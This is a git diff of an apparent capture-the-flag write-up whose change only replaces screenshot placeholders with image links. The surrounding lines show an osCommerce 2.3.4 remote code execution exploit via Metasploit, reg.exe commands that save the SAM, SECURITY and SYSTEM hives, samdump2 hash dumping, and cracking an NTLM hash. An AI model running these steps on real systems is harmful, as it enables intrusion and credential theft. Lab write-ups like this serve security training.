@@ -10,7 +10,7 @@
 nmap IP
 ```
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/183da63e-a847-4526-bf77-9b66a3487800)
 
 2. After exploring the services, navigate to `https://<TARGET_IP>:443`. Here we discover an `oscommerce-2.3.4` directory. Online research indicated that this version has a remote code execution vulnerability that can be exploited using Metasploit
 
@@ -30,7 +30,7 @@ run
 whoami
 ```
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/fb565cb4-1111-4d8e-b882-d2c1872c89da)
 
 3. Navigate to the web application directory and extract the Windows registry hives containing password data
 
@@ -41,7 +41,7 @@ reg.exe save hklm\security SECURITY
 reg.exe save hklm\system SYSTEM
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/53e640ca-22c7-4810-9b8b-5c9cd7b9cee2)
 
 ```bash
 samdump2 SYSTEM SAM
@@ -55,11 +55,11 @@ samdump2 SYSTEM SAM
 samdump2 SYSTEM SAM
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/e68a4936-45c0-444d-9618-07bce61fd657)
 
 6. Copy the NTLM hash for the "Lab" user and paste it into [CrackStation](https://crackstation.net/) to decode it
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/980c12ab-82b6-473a-96e3-00e2bf847c4d)
 
 ---
 
@@ -73,4 +73,4 @@ dir
 type root.txt.txt
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/326939c1-4d75-4045-afe7-784f6af0b377)
